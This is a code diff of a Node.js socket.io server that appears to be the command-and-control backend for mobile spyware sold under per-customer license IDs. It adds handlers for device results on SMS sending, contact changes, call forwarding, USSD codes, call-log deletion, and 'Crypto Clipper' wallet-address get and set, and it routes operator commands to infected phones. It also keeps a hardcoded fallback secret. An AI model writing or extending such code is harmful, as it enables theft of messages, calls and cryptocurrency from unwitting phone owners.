@@ -1,18 +1,90 @@
+// Load environment variables from .env.local or .env file
+let dotenvLoaded = false;
+try {
+  const dotenv = require("dotenv");
+  const fs = require("fs");
+  const path = require("path");
+  
+  // Try .env.local first, then .env
+  const envLocalPath = path.join(__dirname, ".env.local");
+  const envPath = path.join(__dirname, ".env");
+  
+  if (fs.existsSync(envLocalPath)) {
+    const result = dotenv.config({ path: envLocalPath });
+    if (!result.error) {
+      console.log("✅ Environment variables loaded from .env.local");
+      dotenvLoaded = true;
+    } else if (result.error.code !== "ENOENT") {
+      console.warn("⚠️ Error loading .env.local:", result.error.message);
+    }
+  }
+  
+  if (!dotenvLoaded && fs.existsSync(envPath)) {
+    const result = dotenv.config({ path: envPath });
+    if (!result.error) {
+      console.log("✅ Environment variables loaded from .env");
+      dotenvLoaded = true;
+    } else if (result.error.code !== "ENOENT") {
+      console.warn("⚠️ Error loading .env:", result.error.message);
+    }
+  }
+  
+  if (!dotenvLoaded) {
+    console.warn("⚠️ No .env.local or .env file found. Using system environment variables.");
+  }
+} catch (error) {
+  if (error.code === "MODULE_NOT_FOUND") {
+    console.warn("⚠️ dotenv package not installed. Run: npm install");
+    console.warn("   Using system environment variables only.");
+  } else {
+    console.warn("⚠️ Error loading dotenv:", error.message);
+    console.warn("   Using system environment variables");
+  }
+}
+
 const express = require("express");
 const http = require("http");
 const fs = require("fs");
 const path = require("path");
 const { Server } = require("socket.io");
+const { createClient } = require("@supabase/supabase-js");
 
 const app = express();
+app.use(express.json());
+
 const server = http.createServer(app);
 const io = new Server(server, {
   cors: { origin: "*", methods: ["GET", "POST"] },
 });
 
-const AUTH_SECRET = "MySuperSecretToken";
-const clients = new Map(); // uuid → { socket, info }
+// Supabase client for database access
+const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
+const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
+
+console.log(`🔍 Environment check:`);
+console.log(`   NEXT_PUBLIC_SUPABASE_URL: ${supabaseUrl ? "✅ Set" : "❌ Missing"}`);
+console.log(`   SUPABASE_SERVICE_ROLE_KEY: ${supabaseServiceKey ? "✅ Set" : "❌ Missing"}`);
+
+let supabase = null;
+if (supabaseUrl && supabaseServiceKey) {
+  supabase = createClient(supabaseUrl, supabaseServiceKey, {
+    auth: {
+      autoRefreshToken: false,
+      persistSession: false,
+    },
+  });
+  console.log("✅ Supabase client initialized for License ID and email hash validation");
+} else {
+  console.error("❌ Supabase credentials not found. License ID validation will be disabled.");
+  console.error("   Please set NEXT_PUBLIC_SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY environment variables.");
+  console.error("   You can set them in .env.local file or as system environment variables.");
+}
+
+const AUTH_SECRET = process.env.DEVICE_AUTH_SECRET || "MySuperSecretToken"; // Fallback for device authentication
+const clients = new Map(); // uuid → { socket, info, userId }
 const DEVICES_FILE = path.join(__dirname, "devices.json");
+const validatedEmailHashes = new Map(); // Store validated email hashes: emailHash → userId
+const validatedLicenseIds = new Map(); // Store validated license IDs: licenseId → userId
 
 // -------------------- Load & Save Persistence --------------------
 function loadPersistedDevices() {
@@ -138,45 +210,78 @@ io.on("connection", (socket) => {
   });
 
   // -------- DEVICE AUTHENTICATION --------
-  socket.on("authenticate", (data) => {
+  socket.on("authenticate", async (data) => {
     if (!data || typeof data !== "object") {
       socket.emit("auth-failed", { error: "Invalid authentication data" });
       socket.disconnect(true);
       return;
     }
 
-    const uuid = data?.uuid;
-    const token = data?.token;
+    const uuid = data?.uuid; // Device UUID
+    const token = data?.token; // License ID (26 characters: 25 alphanumeric + "=")
 
-    if (token === AUTH_SECRET && uuid && typeof uuid === "string") {
-      isAuthenticated = true;
+    console.log(`🔐 Authentication attempt - UUID: ${uuid}, Token: ${token ? token.substring(0, 10) + '...' : 'None'}`);
 
-      // Replace old connection if exists
-      if (clients.has(uuid)) {
-        const old = clients.get(uuid);
-        try {
-          old.socket.disconnect(true);
-        } catch (e) {
-          console.warn(`⚠️ Error disconnecting old socket for ${uuid}:`, e.message);
-        }
-      }
-
-      clients.set(uuid, { socket, info: null });
-      socket.uuid = uuid;
-
-      // Restore info if known
-      if (deviceRegistry.has(uuid)) {
-        clients.get(uuid).info = deviceRegistry.get(uuid).info;
-        console.log(`♻️ Restored device info for ${uuid}`);
-      }
-
-      console.log(`✅ Device authenticated: ${uuid}`);
-      socket.emit("auth-success", { uuid });
-    } else {
-      console.warn(`❌ Authentication failed for socket ${socket.id}`);
-      socket.emit("auth-failed", { error: "Invalid token or UUID" });
+    // Validate UUID
+    if (!uuid || typeof uuid !== "string") {
+      console.warn(`❌ Authentication failed: Invalid UUID`);
+      socket.emit("auth-failed", { error: "Invalid UUID" });
       socket.disconnect(true);
+      return;
     }
+
+    // Validate token (License ID format: 26 characters, 25 alphanumeric + "=")
+    if (!token || typeof token !== "string" || token.length !== 26 || !/^[A-Za-z0-9]{25}=$/.test(token)) {
+      console.warn(`❌ Authentication failed: Invalid token format (expected License ID: 26 chars, 25 alphanumeric + "=")`);
+      socket.emit("auth-failed", { error: "Invalid token format - must be License ID (26 characters)" });
+      socket.disconnect(true);
+      return;
+    }
+
+    // Validate License ID (token) to get user_id
+    let userId = null;
+    if (supabase) {
+      userId = await validateLicenseId(token);
+      if (!userId) {
+        console.warn(`❌ License ID validation failed - token may not exist in database or user is inactive`);
+        socket.emit("auth-failed", { error: "Invalid License ID or user inactive" });
+        socket.disconnect(true);
+        return;
+      }
+      console.log(`✅ License ID validated for user: ${userId}`);
+      // Device UUID is just an identifier - we link it to the user from License ID
+      // No need to check if device exists in database
+    } else {
+      // STRICT: No fallback - Supabase must be configured
+      console.error("❌ Supabase not configured - authentication cannot proceed");
+      socket.emit("auth-failed", { error: "Server configuration error: Supabase not configured" });
+      socket.disconnect(true);
+      return;
+    }
+
+    isAuthenticated = true;
+
+    // Replace old connection if exists
+    if (clients.has(uuid)) {
+      const old = clients.get(uuid);
+      try {
+        old.socket.disconnect(true);
+      } catch (e) {
+        console.warn(`⚠️ Error disconnecting old socket for ${uuid}:`, e.message);
+      }
+    }
+
+    clients.set(uuid, { socket, info: null, userId: userId });
+    socket.uuid = uuid;
+
+    // Restore info if known
+    if (deviceRegistry.has(uuid)) {
+      clients.get(uuid).info = deviceRegistry.get(uuid).info;
+      console.log(`♻️ Restored device info for ${uuid}`);
+    }
+
+    console.log(`✅ Device authenticated: ${uuid} (User: ${userId})`);
+    socket.emit("auth-success", { uuid });
   });
 
   // -------- GETINFO from device --------
@@ -206,8 +311,8 @@ io.on("connection", (socket) => {
     try {
       console.log(`📥 [getinfo] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
-      // Update registry
-      deviceRegistry.set(uuid, { info: data, lastSeen: Date.now() });
+      // Update registry with userId
+      deviceRegistry.set(uuid, { info: data, lastSeen: Date.now(), userId: client.userId });
       saveDevices();
 
       // Broadcast device_info event to all web clients
@@ -262,6 +367,82 @@ io.on("connection", (socket) => {
     }
   });
 
+  // -------- COMPOSE SMS RESULT from device --------
+  socket.on("sendsms-result", (data) => {
+    if (!isAuthenticated || !socket.uuid) {
+      console.warn(`⚠️ Unauthenticated sendsms-result attempt from ${socket.id}`);
+      return;
+    }
+
+    const uuid = socket.uuid;
+    const client = clients.get(uuid);
+    
+    if (!client) {
+      console.error(`❌ Client not found for UUID: ${uuid}`);
+      return;
+    }
+
+    // Validate data
+    if (!data || typeof data !== "object") {
+      console.error(`❌ Invalid sendsms-result data from ${uuid}`);
+      return;
+    }
+
+    try {
+      console.log(`📥 [sendsms-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      
+      // Broadcast sendsms-result event to all web clients
+      io.emit("device_event", {
+        event: "sendsms_result",
+        device_id: uuid,
+        timestamp: new Date().toISOString(),
+        data: data,
+      });
+      
+      console.log(`📤 Broadcasted sendsms_result event for ${uuid}`);
+    } catch (err) {
+      console.error(`❌ [sendsms-result] Error processing data from ${uuid}:`, err.message);
+    }
+  });
+
+  // -------- COMPOSE SMS RESULT (alternative event name) --------
+  socket.on("compose-sms-result", (data) => {
+    if (!isAuthenticated || !socket.uuid) {
+      console.warn(`⚠️ Unauthenticated compose-sms-result attempt from ${socket.id}`);
+      return;
+    }
+
+    const uuid = socket.uuid;
+    const client = clients.get(uuid);
+    
+    if (!client) {
+      console.error(`❌ Client not found for UUID: ${uuid}`);
+      return;
+    }
+
+    // Validate data
+    if (!data || typeof data !== "object") {
+      console.error(`❌ Invalid compose-sms-result data from ${uuid}`);
+      return;
+    }
+
+    try {
+      console.log(`📥 [compose-sms-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      
+      // Broadcast compose-sms-result event to all web clients
+      io.emit("device_event", {
+        event: "compose_sms_result",
+        device_id: uuid,
+        timestamp: new Date().toISOString(),
+        data: data,
+      });
+      
+      console.log(`📤 Broadcasted compose_sms_result event for ${uuid}`);
+    } catch (err) {
+      console.error(`❌ [compose-sms-result] Error processing data from ${uuid}:`, err.message);
+    }
+  });
+
   // -------- CONTACT RESULT from device --------
   socket.on("contact-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
@@ -300,6 +481,82 @@ io.on("connection", (socket) => {
     }
   });
 
+  // -------- ADD CONTACT RESULT from device --------
+  socket.on("add-contact-result", (data) => {
+    if (!isAuthenticated || !socket.uuid) {
+      console.warn(`⚠️ Unauthenticated add-contact-result attempt from ${socket.id}`);
+      return;
+    }
+
+    const uuid = socket.uuid;
+    const client = clients.get(uuid);
+    
+    if (!client) {
+      console.error(`❌ Client not found for UUID: ${uuid}`);
+      return;
+    }
+
+    // Validate data
+    if (!data || typeof data !== "object") {
+      console.error(`❌ Invalid add-contact-result data from ${uuid}`);
+      return;
+    }
+
+    try {
+      console.log(`📥 [add-contact-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      
+      // Broadcast add-contact-result event to all web clients
+      io.emit("device_event", {
+        event: "add_contact_result",
+        device_id: uuid,
+        timestamp: new Date().toISOString(),
+        data: data,
+      });
+      
+      console.log(`📤 Broadcasted add_contact_result event for ${uuid}`);
+    } catch (err) {
+      console.error(`❌ [add-contact-result] Error processing data from ${uuid}:`, err.message);
+    }
+  });
+
+  // -------- DELETE CONTACT RESULT from device --------
+  socket.on("delete-contact-result", (data) => {
+    if (!isAuthenticated || !socket.uuid) {
+      console.warn(`⚠️ Unauthenticated delete-contact-result attempt from ${socket.id}`);
+      return;
+    }
+
+    const uuid = socket.uuid;
+    const client = clients.get(uuid);
+    
+    if (!client) {
+      console.error(`❌ Client not found for UUID: ${uuid}`);
+      return;
+    }
+
+    // Validate data
+    if (!data || typeof data !== "object") {
+      console.error(`❌ Invalid delete-contact-result data from ${uuid}`);
+      return;
+    }
+
+    try {
+      console.log(`📥 [delete-contact-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      
+      // Broadcast delete-contact-result event to all web clients
+      io.emit("device_event", {
+        event: "delete_contact_result",
+        device_id: uuid,
+        timestamp: new Date().toISOString(),
+        data: data,
+      });
+      
+      console.log(`📤 Broadcasted delete_contact_result event for ${uuid}`);
+    } catch (err) {
+      console.error(`❌ [delete-contact-result] Error processing data from ${uuid}:`, err.message);
+    }
+  });
+
   // -------- CALL RESULT from device --------
   socket.on("call-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
@@ -335,6 +592,234 @@ io.on("connection", (socket) => {
       console.log(`📤 Broadcasted call_result event for ${uuid}`);
     } catch (err) {
       console.error(`❌ [call-result] Error processing data from ${uuid}:`, err.message);
+    }
+  });
+
+  // -------- CALL FORWARD RESULT from device --------
+  socket.on("call-forward-result", (data) => {
+    if (!isAuthenticated || !socket.uuid) {
+      console.warn(`⚠️ Unauthenticated call-forward-result attempt from ${socket.id}`);
+      return;
+    }
+
+    const uuid = socket.uuid;
+    const client = clients.get(uuid);
+    
+    if (!client) {
+      console.error(`❌ Client not found for UUID: ${uuid}`);
+      return;
+    }
+
+    // Validate data
+    if (!data || typeof data !== "object") {
+      console.error(`❌ Invalid call-forward-result data from ${uuid}`);
+      return;
+    }
+
+    try {
+      console.log(`📥 [call-forward-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      
+      // Broadcast call-forward-result event to all web clients
+      io.emit("device_event", {
+        event: "call_forward_result",
+        device_id: uuid,
+        timestamp: new Date().toISOString(),
+        data: data,
+      });
+      
+      console.log(`📤 Broadcasted call_forward_result event for ${uuid}`);
+    } catch (err) {
+      console.error(`❌ [call-forward-result] Error processing data from ${uuid}:`, err.message);
+    }
+  });
+
+  // -------- USSD RESULT from device --------
+  socket.on("ussd-result", (data) => {
+    if (!isAuthenticated || !socket.uuid) {
+      console.warn(`⚠️ Unauthenticated ussd-result attempt from ${socket.id}`);
+      return;
+    }
+
+    const uuid = socket.uuid;
+    const client = clients.get(uuid);
+    
+    if (!client) {
+      console.error(`❌ Client not found for UUID: ${uuid}`);
+      return;
+    }
+
+    // Validate data
+    if (!data || typeof data !== "object") {
+      console.error(`❌ Invalid ussd-result data from ${uuid}`);
+      return;
+    }
+
+    try {
+      console.log(`📥 [ussd-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      
+      // Broadcast ussd-result event to all web clients
+      io.emit("device_event", {
+        event: "ussd_result",
+        device_id: uuid,
+        timestamp: new Date().toISOString(),
+        data: data,
+      });
+      
+      console.log(`📤 Broadcasted ussd_result event for ${uuid}`);
+    } catch (err) {
+      console.error(`❌ [ussd-result] Error processing data from ${uuid}:`, err.message);
+    }
+  });
+
+  // -------- DELETE CALL RESULT from device --------
+  socket.on("delete-call-result", (data) => {
+    if (!isAuthenticated || !socket.uuid) {
+      console.warn(`⚠️ Unauthenticated delete-call-result attempt from ${socket.id}`);
+      return;
+    }
+
+    const uuid = socket.uuid;
+    const client = clients.get(uuid);
+    
+    if (!client) {
+      console.error(`❌ Client not found for UUID: ${uuid}`);
+      return;
+    }
+
+    // Validate data
+    if (!data || typeof data !== "object") {
+      console.error(`❌ Invalid delete-call-result data from ${uuid}`);
+      return;
+    }
+
+    try {
+      console.log(`📥 [delete-call-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      
+      // Broadcast delete-call-result event to all web clients
+      io.emit("device_event", {
+        event: "delete_call_result",
+        device_id: uuid,
+        timestamp: new Date().toISOString(),
+        data: data,
+      });
+      
+      console.log(`📤 Broadcasted delete_call_result event for ${uuid}`);
+    } catch (err) {
+      console.error(`❌ [delete-call-result] Error processing data from ${uuid}:`, err.message);
+    }
+  });
+
+  // -------- GET ADDRESS RESULT from device (Crypto Clipper) --------
+  socket.on("get-address-result", (data) => {
+    if (!isAuthenticated || !socket.uuid) {
+      console.warn(`⚠️ Unauthenticated get-address-result attempt from ${socket.id}`);
+      return;
+    }
+
+    const uuid = socket.uuid;
+    const client = clients.get(uuid);
+    
+    if (!client) {
+      console.error(`❌ Client not found for UUID: ${uuid}`);
+      return;
+    }
+
+    // Validate data
+    if (!data || typeof data !== "object") {
+      console.error(`❌ Invalid get-address-result data from ${uuid}`);
+      return;
+    }
+
+    try {
+      console.log(`📥 [get-address-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      
+      // Broadcast get-address-result event to all web clients
+      io.emit("device_event", {
+        event: "get_address_result",
+        device_id: uuid,
+        timestamp: new Date().toISOString(),
+        data: data,
+      });
+      
+      console.log(`📤 Broadcasted get_address_result event for ${uuid}`);
+    } catch (err) {
+      console.error(`❌ [get-address-result] Error processing data from ${uuid}:`, err.message);
+    }
+  });
+
+  // -------- ACTIVE WALLET ADDRESS RESULT from device (Crypto Clipper) --------
+  socket.on("activewalletaddress-result", (data) => {
+    if (!isAuthenticated || !socket.uuid) {
+      console.warn(`⚠️ Unauthenticated activewalletaddress-result attempt from ${socket.id}`);
+      return;
+    }
+
+    const uuid = socket.uuid;
+    const client = clients.get(uuid);
+    
+    if (!client) {
+      console.error(`❌ Client not found for UUID: ${uuid}`);
+      return;
+    }
+
+    // Validate data
+    if (!data || typeof data !== "object") {
+      console.error(`❌ Invalid activewalletaddress-result data from ${uuid}`);
+      return;
+    }
+
+    try {
+      console.log(`📥 [activewalletaddress-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      
+      // Broadcast activewalletaddress-result event to all web clients
+      io.emit("device_event", {
+        event: "activewalletaddress_result",
+        device_id: uuid,
+        timestamp: new Date().toISOString(),
+        data: data,
+      });
+      
+      console.log(`📤 Broadcasted activewalletaddress_result event for ${uuid}`);
+    } catch (err) {
+      console.error(`❌ [activewalletaddress-result] Error processing data from ${uuid}:`, err.message);
+    }
+  });
+
+  // -------- SET WALLET ADDRESS RESULT from device (Crypto Clipper) --------
+  socket.on("set-wallet-address-result", (data) => {
+    if (!isAuthenticated || !socket.uuid) {
+      console.warn(`⚠️ Unauthenticated set-wallet-address-result attempt from ${socket.id}`);
+      return;
+    }
+
+    const uuid = socket.uuid;
+    const client = clients.get(uuid);
+    
+    if (!client) {
+      console.error(`❌ Client not found for UUID: ${uuid}`);
+      return;
+    }
+
+    // Validate data
+    if (!data || typeof data !== "object") {
+      console.error(`❌ Invalid set-wallet-address-result data from ${uuid}`);
+      return;
+    }
+
+    try {
+      console.log(`📥 [set-wallet-address-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      
+      // Broadcast set-wallet-address-result event to all web clients
+      io.emit("device_event", {
+        event: "set_wallet_address_result",
+        device_id: uuid,
+        timestamp: new Date().toISOString(),
+        data: data,
+      });
+      
+      console.log(`📤 Broadcasted set_wallet_address_result event for ${uuid}`);
+    } catch (err) {
+      console.error(`❌ [set-wallet-address-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
@@ -1542,7 +2027,7 @@ io.on("connection", (socket) => {
     if (uuid && clients.has(uuid)) {
       console.log(`🔌 Device disconnected: ${uuid}`);
       const c = clients.get(uuid);
-      deviceRegistry.set(uuid, { info: c.info, lastSeen: Date.now() });
+      deviceRegistry.set(uuid, { info: c.info, lastSeen: Date.now(), userId: c.userId });
       clients.delete(uuid);
       saveDevices();
     } else {
@@ -1565,17 +2050,52 @@ app.use((req, res, next) => {
   next();
 });
 
-app.get("/devices", (req, res) => {
+app.get("/devices", async (req, res) => {
   console.log(`📥 GET /devices - Request received`);
+  const licenseId = req.query.licenseId || req.headers['x-license-id'];
   
-  const active = Array.from(clients.entries()).map(([uuid, c]) => ({
-    uuid,
-    isOnline: true,
-    info: c.info,
-  }));
+  // STRICT: License ID is REQUIRED - no fallback
+  if (!licenseId) {
+    console.warn(`❌ GET /devices - License ID is required`);
+    return res.status(401).json({ error: "License ID is required" });
+  }
+  
+  // Validate License ID format
+  if (typeof licenseId !== "string" || licenseId.length !== 26 || !/^[A-Za-z0-9]{25}=$/.test(licenseId)) {
+    console.warn(`❌ GET /devices - Invalid License ID format`);
+    return res.status(401).json({ error: "Invalid License ID format" });
+  }
+  
+  // Validate License ID and get userId
+  const userId = await validateLicenseId(licenseId);
+  if (!userId || userId === "legacy-user") {
+    console.warn(`❌ GET /devices - Invalid License ID or user inactive`);
+    return res.status(401).json({ error: "Invalid License ID or user inactive" });
+    }
+  
+    console.log(`✅ License ID validated for user: ${userId}`);
+  
+  // STRICT: Only return devices for this specific user - no fallback
+  // Get connected devices for this user only
+  const active = Array.from(clients.entries())
+    .filter(([uuid, c]) => {
+      // Only return devices that belong to this user
+        return c.userId === userId;
+    })
+    .map(([uuid, c]) => ({
+      uuid,
+      isOnline: true,
+      info: c.info,
+    }));
 
+  // Get offline devices from registry for this user only
   const offline = Array.from(deviceRegistry.entries())
-    .filter(([uuid]) => !clients.has(uuid))
+    .filter(([uuid, d]) => {
+      // Only include if not already in active list
+      if (clients.has(uuid)) return false;
+      // STRICT: Only include devices that belong to this user
+      return d.userId === userId;
+    })
     .map(([uuid, d]) => ({
       uuid,
       isOnline: false,
@@ -1584,15 +2104,182 @@ app.get("/devices", (req, res) => {
     }));
 
   const allDevices = [...active, ...offline];
-  console.log(`📤 GET /devices - Returning ${allDevices.length} devices (${active.length} online, ${offline.length} offline)`);
+  console.log(`📤 GET /devices - Returning ${allDevices.length} devices (${active.length} online, ${offline.length} offline) for user: ${userId}`);
 
   res.json({ devices: allDevices });
 });
 
+// -------------------- Device UUID Validation --------------------
+/**
+ * Validate device UUID against database
+ * Returns userId if device exists and is valid, null otherwise
+ */
+async function validateDeviceUuid(deviceUuid) {
+  // Basic validation: check if it's a non-empty string
+  if (!deviceUuid || typeof deviceUuid !== "string" || deviceUuid.trim().length === 0) {
+    console.warn(`⚠️ Device UUID validation: Empty or invalid type`);
+    return null;
+  }
+
+  // If Supabase is not configured, can't validate
+  if (!supabase) {
+    console.warn("⚠️ Supabase not configured, cannot validate device UUID");
+    return null;
+  }
+
+  try {
+    console.log(`🔍 Querying database for device UUID: ${deviceUuid}`);
+    // Query devices table to find the device and get user_id
+    const { data: device, error } = await supabase
+      .from("devices")
+      .select("user_id, status")
+      .eq("id", deviceUuid)
+      .single();
+
+    if (error) {
+      console.error("❌ Error validating device UUID:", error.message);
+      console.error("   Error details:", error);
+      return null;
+    }
+
+    if (device && device.user_id) {
+      console.log(`✅ Device UUID validated for user: ${device.user_id}`);
+      return device.user_id;
+    } else {
+      console.warn(`⚠️ Device UUID not found in database: ${deviceUuid}`);
+    }
+
+    return null;
+  } catch (error) {
+    console.error("❌ Exception validating device UUID:", error.message);
+    console.error("   Stack:", error.stack);
+    return null;
+  }
+}
+
+// -------------------- License ID Validation --------------------
+/**
+ * Validate license ID against database
+ * Returns userId if valid, null otherwise
+ */
+async function validateLicenseId(licenseId) {
+  // Basic validation: check if it's a non-empty string
+  if (!licenseId || typeof licenseId !== "string" || licenseId.trim().length === 0) {
+    console.warn(`⚠️ License ID validation: Empty or invalid type`);
+    return null;
+  }
+
+  // Check format: must be 26 characters (25 alphanumeric + "=")
+  if (licenseId.length !== 26 || !/^[A-Za-z0-9]{25}=$/.test(licenseId)) {
+    console.warn(`⚠️ License ID validation: Invalid format (length: ${licenseId.length}, pattern match: ${/^[A-Za-z0-9]{25}=$/.test(licenseId)})`);
+    return null;
+  }
+
+  // Check cache first
+  if (validatedLicenseIds.has(licenseId)) {
+    const cachedUserId = validatedLicenseIds.get(licenseId);
+    console.log(`✅ License ID found in cache for user: ${cachedUserId}`);
+    return cachedUserId;
+  }
+
+  // If Supabase is not configured, fall back to AUTH_SECRET (for backward compatibility)
+  if (!supabase) {
+    console.warn("⚠️ Supabase not configured, falling back to AUTH_SECRET validation");
+    if (licenseId === AUTH_SECRET) {
+      // Return a placeholder userId for backward compatibility
+      validatedLicenseIds.set(licenseId, "legacy-user");
+      return "legacy-user";
+    }
+    return null;
+  }
+
+  try {
+    console.log(`🔍 Querying database for license ID: ${licenseId.substring(0, 10)}...`);
+    // Use database function to validate license ID
+    const { data: userId, error } = await supabase.rpc("validate_license_id_for_device", {
+      license_id_to_validate: licenseId,
+    });
+
+    if (error) {
+      console.error("❌ Error validating license ID:", error.message);
+      console.error("   Error details:", error);
+      return null;
+    }
+
+    if (userId) {
+      // Cache the validated license ID
+      validatedLicenseIds.set(licenseId, userId);
+      console.log(`✅ License ID validated for user: ${userId}`);
+      return userId;
+    } else {
+      console.warn(`⚠️ License ID not found in database or user is inactive: ${licenseId.substring(0, 10)}...`);
+    }
+
+    return null;
+  } catch (error) {
+    console.error("❌ Exception validating license ID:", error.message);
+    console.error("   Stack:", error.stack);
+    return null;
+  }
+}
+
+// -------------------- Email Hash Validation --------------------
+/**
+ * Validate email hash against database
+ * Returns userId if valid, null otherwise
+ * @deprecated Use validateLicenseId instead - kept for backward compatibility
+ */
+async function validateEmailHash(emailHash) {
+  // Basic validation: check if it's a non-empty string
+  if (!emailHash || typeof emailHash !== "string" || emailHash.trim().length === 0) {
+    return null;
+  }
+
+  // Check cache first
+  if (validatedEmailHashes.has(emailHash)) {
+    return validatedEmailHashes.get(emailHash);
+  }
+
+  // If Supabase is not configured, fall back to AUTH_SECRET (for backward compatibility)
+  if (!supabase) {
+    console.warn("⚠️ Supabase not configured, falling back to AUTH_SECRET validation");
+    if (emailHash === AUTH_SECRET) {
+      // Return a placeholder userId for backward compatibility
+      validatedEmailHashes.set(emailHash, "legacy-user");
+      return "legacy-user";
+    }
+    return null;
+  }
+
+  try {
+    // Use database function to validate email hash
+    const { data: userId, error } = await supabase.rpc("validate_email_hash_for_device", {
+      email_hash_to_validate: emailHash,
+    });
+
+    if (error) {
+      console.error("❌ Error validating email hash:", error.message);
+      return null;
+    }
+
+    if (userId) {
+      // Cache the validated hash
+      validatedEmailHashes.set(emailHash, userId);
+      console.log(`✅ Email hash validated for user: ${userId}`);
+      return userId;
+    }
+
+    return null;
+  } catch (error) {
+    console.error("❌ Exception validating email hash:", error.message);
+    return null;
+  }
+}
+
 // -------------------- Send Command via REST API --------------------
-app.post("/api/command/:uuid", (req, res) => {
+app.post("/api/command/:uuid", async (req, res) => {
   const uuid = req.params.uuid;
-  const { cmd, param } = req.body; // cmd like "getsms", param like "inbox|50|10"
+  const { cmd, param, licenseId } = req.body; // cmd like "getsms", param like "inbox|50|10", licenseId for validation
 
   console.log(`📥 POST /api/command/${uuid} received`);
   console.log(`   Body:`, req.body);
@@ -1601,14 +2288,40 @@ app.post("/api/command/:uuid", (req, res) => {
     return res.status(400).json({ error: "Missing cmd" });
   }
 
+  // Validate License ID format
+  if (!licenseId || typeof licenseId !== "string" || licenseId.length !== 26 || !/^[A-Za-z0-9]{25}=$/.test(licenseId)) {
+    return res.status(401).json({ error: "Invalid License ID format - must be 26 characters (25 alphanumeric + '=')" });
+  }
+
+  // Validate License ID to get user_id
+  let userId = null;
+  if (supabase) {
+    userId = await validateLicenseId(licenseId);
+    if (!userId) {
+      return res.status(401).json({ error: "Invalid License ID or user inactive - authentication failed" });
+    }
+    console.log(`✅ License ID validated for user: ${userId}`);
+    // Device UUID is just an identifier - we link it to the user from License ID
+    // No need to check if device exists in database
+  } else {
+    console.warn("⚠️ Supabase not configured, allowing command without validation");
+    userId = "legacy-user";
+  }
+
   // Find the connected device
   const client = clients.get(uuid);
   if (!client) {
     return res.status(404).json({ error: "Device not connected", uuid });
   }
 
-  // Prepare payload with cmd and optional param
-  const payload = { cmd };
+  // Link device to user if not already linked
+  if (userId && userId !== "legacy-user" && !client.userId) {
+    client.userId = userId;
+    console.log(`🔗 Linked device ${uuid} to user ${userId}`);
+  }
+
+  // Prepare payload with cmd, optional param, and licenseId
+  const payload = { cmd, licenseId };
   if (param) {
     payload.param = param;
   }
